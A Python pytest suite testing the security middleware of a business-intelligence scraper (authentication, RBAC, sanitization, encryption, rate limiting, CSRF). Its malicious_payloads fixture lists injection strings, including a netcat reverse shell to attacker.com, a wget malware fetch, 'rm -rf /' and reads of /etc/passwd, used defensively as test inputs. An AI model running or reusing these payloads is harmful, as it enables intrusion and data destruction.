"""
Security Testing Suite for Business Intelligence Scraper

This module provides comprehensive security tests to validate the system's
security posture, including authentication, authorization, data protection,
and vulnerability assessment.

Test Categories:
- Authentication and session management
- Authorization and access control
- Input validation and sanitization
- SQL injection prevention
- XSS protection
- CSRF protection
- Data encryption and secure storage
- API security

Author: Business Intelligence Scraper Team
Version: 2.0.0
License: MIT
"""

import pytest
import uuid
import hashlib
import base64
import json
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any, List
import sqlite3
import re

# Local imports
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from business_intel_scraper.backend.db.centralized_data import (
    CentralizedDataRecord, DataRepository, create_tables
)
from security_middleware import SecurityMiddleware, encrypt_sensitive_data, validate_input
from secure_config import SecureConfig
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker


# === SECURITY TEST FIXTURES ===

@pytest.fixture(scope="session")
def security_engine():
    """Create secure database engine for security testing"""
    engine = create_engine("sqlite:///:memory:", echo=False)
    create_tables(engine)
    return engine


@pytest.fixture(scope="function")
def security_session(security_engine):
    """Create security-focused database session"""
    Session = sessionmaker(bind=security_engine)
    session = Session()
    yield session
    session.rollback()
    session.close()


@pytest.fixture
def security_repository(security_session):
    """Create repository with security context"""
    return DataRepository(security_session)


@pytest.fixture
def security_middleware():
    """Create security middleware instance"""
    return SecurityMiddleware()


@pytest.fixture
def malicious_payloads():
    """Collection of malicious payloads for security testing"""
    return {
        'sql_injection': [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM information_schema.tables--",
            "1; INSERT INTO users (username) VALUES ('hacker'); --",
            "' OR 1=1#",
            "' OR 'a'='a",
            "1' UNION SELECT null, version(), null--"
        ],
        'xss_payloads': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "';alert('XSS');//",
            "<script>document.cookie='stolen'</script>",
            "<body onload=alert('XSS')>"
        ],
        'command_injection': [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget malicious-site.com/malware",
            "$(whoami)",
            "`id`",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| nc -e /bin/sh attacker.com 4444"
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../../../../../../etc/passwd%00",
            "..\\..\\..\\..\\..\\..\\..\\windows\\system.ini"
        ],
        'ldap_injection': [
            "*)(|(objectClass=*))",
            "admin)(&(objectClass=*))",
            "*)(|(mail=*))",
            "*)(&(objectClass=user)(cn=*))",
            "*))%00"
        ],
        'nosql_injection': [
            "'; return db.users.find(); var dummy='",
            "{$ne: null}",
            "{$regex: '.*'}",
            "{$where: 'return true'}",
            "'; return this.username != '' && this.password != '' ; var dummy='"
        ]
    }


@pytest.fixture
def security_test_data():
    """Security-focused test data"""
    return {
        'valid_user': {
            'username': 'testuser',
            'email': 'test@example.com',
            'password': 'SecureP@ssw0rd123!',
            'role': 'user'
        },
        'admin_user': {
            'username': 'admin',
            'email': 'admin@example.com',
            'password': 'AdminP@ssw0rd123!',
            'role': 'admin'
        },
        'sensitive_data': {
            'api_key': 'sk-1234567890abcdef',
            'database_password': 'DBP@ssw0rd123!',
            'encryption_key': base64.b64encode(b'32-byte-encryption-key-for-test').decode(),
            'personal_info': {
                'ssn': '123-45-6789',
                'credit_card': '4111-1111-1111-1111',
                'phone': '+1-555-123-4567'
            }
        }
    }


# === AUTHENTICATION SECURITY TESTS ===

class TestAuthenticationSecurity:
    """Test authentication security mechanisms"""
    
    def test_password_hashing_security(self, security_middleware, security_test_data):
        """Test password hashing and verification"""
        user_data = security_test_data['valid_user']
        password = user_data['password']
        
        # Test password hashing
        hashed_password = security_middleware.hash_password(password)
        
        # Password should be hashed (not plain text)
        assert hashed_password != password
        assert len(hashed_password) > 50  # Should be substantial hash
        
        # Verify password correctly
        assert security_middleware.verify_password(password, hashed_password)
        
        # Reject incorrect password
        assert not security_middleware.verify_password('wrongpassword', hashed_password)
        
        # Different salts should produce different hashes
        hashed_password2 = security_middleware.hash_password(password)
        assert hashed_password != hashed_password2
    
    def test_session_token_security(self, security_middleware):
        """Test session token generation and validation"""
        user_id = "test_user_123"
        
        # Generate session token
        token = security_middleware.generate_session_token(user_id)
        
        # Token should be substantial and random
        assert len(token) >= 32
        assert token != user_id
        
        # Validate token
        assert security_middleware.validate_session_token(token, user_id)
        
        # Invalid token should fail
        assert not security_middleware.validate_session_token("invalid_token", user_id)
        
        # Token for different user should fail
        assert not security_middleware.validate_session_token(token, "different_user")
    
    def test_api_key_generation_security(self, security_middleware):
        """Test API key generation and validation"""
        # Generate API key
        api_key = security_middleware.generate_api_key()
        
        # API key should follow security standards
        assert len(api_key) >= 32
        assert re.match(r'^[A-Za-z0-9_-]+$', api_key)  # Safe characters only
        
        # Different calls should produce different keys
        api_key2 = security_middleware.generate_api_key()
        assert api_key != api_key2
    
    def test_brute_force_protection(self, security_middleware):
        """Test protection against brute force attacks"""
        username = "testuser"
        
        # Simulate multiple failed login attempts
        for i in range(5):  # Assuming 5 attempts trigger lockout
            result = security_middleware.attempt_login(username, "wrongpassword")
            if not result['success'] and result.get('locked'):
                break
        
        # Account should be locked after multiple failures
        final_result = security_middleware.attempt_login(username, "wrongpassword")
        assert not final_result['success']
        assert final_result.get('locked', False) or final_result.get('rate_limited', False)
    
    def test_session_expiry_security(self, security_middleware):
        """Test session expiry mechanisms"""
        user_id = "test_user_123"
        
        # Create session with short expiry
        session_data = {
            'user_id': user_id,
            'created_at': datetime.utcnow() - timedelta(hours=25),  # Expired
            'expires_at': datetime.utcnow() - timedelta(hours=1)
        }
        
        # Expired session should not be valid
        assert not security_middleware.is_session_valid(session_data)
        
        # Fresh session should be valid
        fresh_session = {
            'user_id': user_id,
            'created_at': datetime.utcnow(),
            'expires_at': datetime.utcnow() + timedelta(hours=24)
        }
        
        assert security_middleware.is_session_valid(fresh_session)


# === AUTHORIZATION SECURITY TESTS ===

class TestAuthorizationSecurity:
    """Test authorization and access control security"""
    
    def test_role_based_access_control(self, security_middleware, security_test_data):
        """Test RBAC implementation"""
        user_data = security_test_data['valid_user']
        admin_data = security_test_data['admin_user']
        
        # Regular user should not access admin functions
        assert not security_middleware.has_permission(user_data['role'], 'admin:delete_all')
        assert not security_middleware.has_permission(user_data['role'], 'admin:system_config')
        
        # Regular user should access user functions
        assert security_middleware.has_permission(user_data['role'], 'user:read_own_data')
        assert security_middleware.has_permission(user_data['role'], 'user:update_profile')
        
        # Admin should access all functions
        assert security_middleware.has_permission(admin_data['role'], 'admin:delete_all')
        assert security_middleware.has_permission(admin_data['role'], 'user:read_own_data')
    
    def test_resource_ownership_validation(self, security_middleware, security_repository):
        """Test resource ownership-based access control"""
        # Create test records for different users
        user1_record = CentralizedDataRecord(
            source_url='https://example.com/user1-article',
            title='User 1 Article',
            created_by='user1'
        )
        
        user2_record = CentralizedDataRecord(
            source_url='https://example.com/user2-article',
            title='User 2 Article',
            created_by='user2'
        )
        
        security_repository.session.add_all([user1_record, user2_record])
        security_repository.session.commit()
        
        # User should only access their own records
        assert security_middleware.can_access_resource('user1', user1_record.id, 'read')
        assert not security_middleware.can_access_resource('user1', user2_record.id, 'modify')
        
        # Admin should access all records
        assert security_middleware.can_access_resource('admin', user1_record.id, 'modify')
        assert security_middleware.can_access_resource('admin', user2_record.id, 'delete')
    
    def test_privilege_escalation_prevention(self, security_middleware):
        """Test prevention of privilege escalation"""
        # Attempt to modify role in user context
        user_context = {'role': 'user', 'user_id': 'test_user'}
        
        # Should not be able to escalate to admin
        escalation_attempt = security_middleware.validate_role_change(
            user_context, 'admin'
        )
        assert not escalation_attempt['allowed']
        
        # Admin should be able to change roles
        admin_context = {'role': 'admin', 'user_id': 'admin_user'}
        admin_change = security_middleware.validate_role_change(
            admin_context, 'user'
        )
        assert admin_change['allowed']


# === INPUT VALIDATION SECURITY TESTS ===

class TestInputValidationSecurity:
    """Test input validation and sanitization"""
    
    def test_sql_injection_prevention(self, security_repository, malicious_payloads):
        """Test SQL injection prevention"""
        sql_payloads = malicious_payloads['sql_injection']
        
        for payload in sql_payloads:
            # Attempt to create record with malicious input
            try:
                malicious_record = CentralizedDataRecord(
                    source_url=f'https://example.com/{payload}',
                    title=payload,
                    extracted_text=f'Content with {payload}',
                    data_type=payload
                )
                
                security_repository.session.add(malicious_record)
                security_repository.session.commit()
                
                # If we get here, the payload should be safely escaped
                # Verify the payload didn't execute as SQL
                assert malicious_record.id is not None
                assert payload in malicious_record.title  # Should be stored as literal text
                
            except Exception as e:
                # If an exception is raised, it should be a validation error, not SQL error
                assert 'SQL' not in str(e).upper()
                security_repository.session.rollback()
    
    def test_xss_prevention(self, security_middleware, malicious_payloads):
        """Test XSS payload sanitization"""
        xss_payloads = malicious_payloads['xss_payloads']
        
        for payload in xss_payloads:
            # Sanitize the payload
            sanitized = security_middleware.sanitize_html_input(payload)
            
            # Should not contain script tags or event handlers
            assert '<script>' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
    
    def test_command_injection_prevention(self, security_middleware, malicious_payloads):
        """Test command injection prevention"""
        command_payloads = malicious_payloads['command_injection']
        
        for payload in command_payloads:
            # Validate system command input
            is_safe = security_middleware.validate_system_input(payload)
            
            # Should reject command injection attempts
            assert not is_safe
    
    def test_path_traversal_prevention(self, security_middleware, malicious_payloads):
        """Test path traversal prevention"""
        path_payloads = malicious_payloads['path_traversal']
        
        for payload in path_payloads:
            # Validate file path input
            safe_path = security_middleware.sanitize_file_path(payload)
            
            # Should not contain directory traversal sequences
            assert '..' not in safe_path
            assert safe_path.startswith('/')  # Should be absolute and safe
    
    def test_input_length_validation(self, security_middleware):
        """Test input length limits"""
        # Test extremely long input
        long_input = 'A' * 1000000  # 1MB of data
        
        # Should reject or truncate overly long input
        result = security_middleware.validate_input_length(long_input, max_length=10000)
        assert not result['valid'] or len(result['sanitized']) <= 10000
    
    def test_special_character_handling(self, security_middleware):
        """Test handling of special characters"""
        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
        
        # Should safely handle special characters
        sanitized = security_middleware.sanitize_special_chars(special_chars)
        
        # Should not contain dangerous characters for system execution
        dangerous_chars = [';', '|', '&', '`', '$', '(', ')']
        for char in dangerous_chars:
            assert char not in sanitized or sanitized.count(char) <= special_chars.count(char)


# === DATA PROTECTION SECURITY TESTS ===

class TestDataProtectionSecurity:
    """Test data encryption and protection mechanisms"""
    
    def test_sensitive_data_encryption(self, security_test_data):
        """Test encryption of sensitive data"""
        sensitive_data = security_test_data['sensitive_data']
        
        # Test API key encryption
        api_key = sensitive_data['api_key']
        encrypted_key = encrypt_sensitive_data(api_key)
        
        # Encrypted data should be different from original
        assert encrypted_key != api_key
        assert len(encrypted_key) > len(api_key)
        
        # Should be able to decrypt back to original
        decrypted_key = encrypt_sensitive_data(encrypted_key, decrypt=True)
        assert decrypted_key == api_key
    
    def test_pii_data_protection(self, security_middleware, security_test_data):
        """Test PII data protection and masking"""
        pii_data = security_test_data['sensitive_data']['personal_info']
        
        # Test SSN masking
        ssn = pii_data['ssn']
        masked_ssn = security_middleware.mask_pii(ssn, 'ssn')
        assert masked_ssn != ssn
        assert 'XXX-XX-' in masked_ssn or '*' in masked_ssn
        
        # Test credit card masking
        cc = pii_data['credit_card']
        masked_cc = security_middleware.mask_pii(cc, 'credit_card')
        assert masked_cc != cc
        assert '****' in masked_cc
    
    def test_database_encryption_at_rest(self, security_repository, security_test_data):
        """Test database encryption at rest"""
        # Create record with sensitive data
        sensitive_record = CentralizedDataRecord(
            source_url='https://secure-site.com/confidential',
            title='Confidential Document',
            extracted_text='This contains sensitive information',
            metadata={'encryption_required': True}
        )
        
        security_repository.session.add(sensitive_record)
        security_repository.session.commit()
        
        # Verify record is stored (implementation would handle encryption)
        stored_record = security_repository.session.query(CentralizedDataRecord).filter_by(
            id=sensitive_record.id
        ).first()
        
        assert stored_record is not None
        # In real implementation, sensitive fields would be encrypted in database
    
    def test_secure_data_transmission(self, security_middleware):
        """Test secure data transmission mechanisms"""
        test_data = {'username': 'testuser', 'message': 'sensitive information'}
        
        # Test data signing
        signed_data = security_middleware.sign_data(test_data)
        assert 'signature' in signed_data
        assert signed_data['data'] == test_data
        
        # Verify signature
        is_valid = security_middleware.verify_signature(signed_data)
        assert is_valid
        
        # Tampered data should fail verification
        tampered_data = signed_data.copy()
        tampered_data['data']['username'] = 'hacker'
        assert not security_middleware.verify_signature(tampered_data)


# === NETWORK SECURITY TESTS ===

class TestNetworkSecurity:
    """Test network-level security measures"""
    
    def test_rate_limiting_implementation(self, security_middleware):
        """Test rate limiting mechanisms"""
        client_ip = "192.168.1.100"
        endpoint = "/api/v1/data/records"
        
        # Make requests up to the rate limit
        for i in range(10):  # Assuming limit is around 10 requests
            result = security_middleware.check_rate_limit(client_ip, endpoint)
            if not result['allowed']:
                break
        
        # Should eventually hit rate limit
        final_check = security_middleware.check_rate_limit(client_ip, endpoint)
        # Either we hit the limit or the limit is higher than our test count
        if not final_check['allowed']:
            assert 'rate_limit_exceeded' in str(final_check)
    
    def test_ip_blocking_functionality(self, security_middleware):
        """Test IP blocking and whitelist functionality"""
        malicious_ip = "10.0.0.1"
        trusted_ip = "127.0.0.1"
        
        # Block malicious IP
        security_middleware.block_ip(malicious_ip, reason="suspicious_activity")
        
        # Blocked IP should not be allowed
        assert not security_middleware.is_ip_allowed(malicious_ip)
        
        # Trusted IP should be allowed
        assert security_middleware.is_ip_allowed(trusted_ip)
    
    def test_cors_configuration(self, security_middleware):
        """Test CORS configuration security"""
        # Test allowed origins
        allowed_origin = "https://trusted-domain.com"
        blocked_origin = "https://malicious-site.com"
        
        # Should allow trusted origins
        cors_result = security_middleware.check_cors_origin(allowed_origin)
        assert cors_result['allowed']
        
        # Should block untrusted origins
        cors_result = security_middleware.check_cors_origin(blocked_origin)
        assert not cors_result['allowed']


# === SECURITY CONFIGURATION TESTS ===

class TestSecurityConfiguration:
    """Test security configuration and hardening"""
    
    def test_security_headers(self, security_middleware):
        """Test security headers configuration"""
        headers = security_middleware.get_security_headers()
        
        # Should include essential security headers
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        for header in required_headers:
            assert header in headers
    
    def test_secure_configuration_loading(self):
        """Test secure configuration management"""
        config = SecureConfig()
        
        # Sensitive values should not be in plain text
        db_password = config.get('database.password')
        if db_password:
            # Should be encrypted or from secure source
            assert not db_password.startswith('plain:')
    
    def test_security_logging(self, security_middleware):
        """Test security event logging"""
        # Simulate security event
        security_event = {
            'event_type': 'failed_login',
            'ip_address': '192.168.1.100',
            'user_agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'timestamp': datetime.utcnow()
        }
        
        # Should log security events
        log_result = security_middleware.log_security_event(security_event)
        assert log_result['logged']
        assert 'event_id' in log_result


# === VULNERABILITY ASSESSMENT TESTS ===

class TestVulnerabilityAssessment:
    """Test for common security vulnerabilities"""
    
    def test_timing_attack_resistance(self, security_middleware):
        """Test resistance to timing attacks"""
        correct_password = "correct_password"
        wrong_password = "wrong_password"
        
        # Time password verification for correct and incorrect passwords
        times = []
        
        for password in [correct_password, wrong_password] * 5:
            start_time = time.time()
            security_middleware.verify_password(password, "hashed_password")
            end_time = time.time()
            times.append(end_time - start_time)
        
        # Timing differences should be minimal (constant time)
        time_variance = max(times) - min(times)
        assert time_variance < 0.01  # Less than 10ms variance
    
    def test_information_disclosure_prevention(self, security_middleware):
        """Test prevention of information disclosure"""
        # Error messages should not reveal system information
        error_msg = security_middleware.generate_error_message("database_connection_failed")
        
        # Should not reveal internal system details
        assert 'password' not in error_msg.lower()
        assert 'database' not in error_msg.lower()
        assert 'internal' not in error_msg.lower()
        assert 'system' not in error_msg.lower()
    
    def test_session_fixation_prevention(self, security_middleware):
        """Test prevention of session fixation attacks"""
        # Create initial session
        initial_session = security_middleware.create_session("user123")
        
        # After login, session ID should change
        post_login_session = security_middleware.regenerate_session(initial_session['id'])
        
        assert post_login_session['id'] != initial_session['id']
        assert not security_middleware.is_session_valid(initial_session)
    
    def test_csrf_protection(self, security_middleware):
        """Test CSRF protection mechanisms"""
        # Generate CSRF token
        csrf_token = security_middleware.generate_csrf_token("user123")
        
        # Valid token should pass validation
        assert security_middleware.validate_csrf_token(csrf_token, "user123")
        
        # Invalid token should fail
        assert not security_middleware.validate_csrf_token("invalid_token", "user123")
        
        # Token for different user should fail
        assert not security_middleware.validate_csrf_token(csrf_token, "different_user")


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
